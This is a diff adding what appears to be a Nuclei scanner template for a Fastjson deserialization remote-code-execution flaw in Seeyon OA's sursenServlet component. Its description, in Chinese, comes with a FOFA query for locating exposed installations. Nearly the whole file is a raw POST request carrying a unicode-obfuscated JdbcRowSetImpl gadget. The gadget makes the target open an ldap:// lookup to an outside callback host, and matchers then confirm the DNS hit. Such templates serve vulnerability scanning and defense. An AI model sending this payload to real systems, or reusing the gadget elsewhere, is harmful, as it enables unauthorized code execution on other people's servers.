@@ -1,0 +1,25 @@
+id: seeyon-oa-sursenservlet-command-exec
+info:
+  name: 致远OA sursenServlet 组件 Fastjson 反序列化远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="致远互联-OA"
+        北京致远互联软件股份有限公司作为协同管理软件领域高新技术企业，其产品致远OA/seeyon/sursenServlet组件因Fastjson反序列化机制存在安全缺陷。该漏洞允许攻击者通过构造恶意数据包触发反序列化过程，在目标系统上执行任意代码。经验证，漏洞影响版本未明确标注，建议用户及时升级至官方修复版本。
+  tags: 致远OA
+http:
+- raw:
+  - |
+    POST /seeyon/sursenServlet HTTP/1.1
+    Host: {{Hostname}}
+
+    sursenData=%7B%22name%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0043%5Cu006c%5Cu0061%5Cu0073%5Cu0073%22%2C%22%5Cu0076%5Cu0061%5Cu006c%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%7D%2C%22x%22%3A%7B%22%5Cu0040%5Cu0074%5Cu0079%5Cu0070%5Cu0065%22%3A%22%5Cu0063%5Cu006f%5Cu006d%5Cu002e%5Cu0073%5Cu0075%5Cu006e%5Cu002e%5Cu0072%5Cu006f%5Cu0077%5Cu0073%5Cu0065%5Cu0074%5Cu002e%5Cu004a%5Cu0064%5Cu0062%5Cu0063%5Cu0052%5Cu006f%5Cu0077%5Cu0053%5Cu0065%5Cu0074%5Cu0049%5Cu006d%5Cu0070%5Cu006c%22%2C%22%5Cu0064%5Cu0061%5Cu0074%5Cu0061%5Cu0053%5Cu006f%5Cu0075%5Cu0072%5Cu0063%5Cu0065%5Cu004e%5Cu0061%5Cu006d%5Cu0065":"ldap://{{interactsh-url}}","autoCommit":true}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
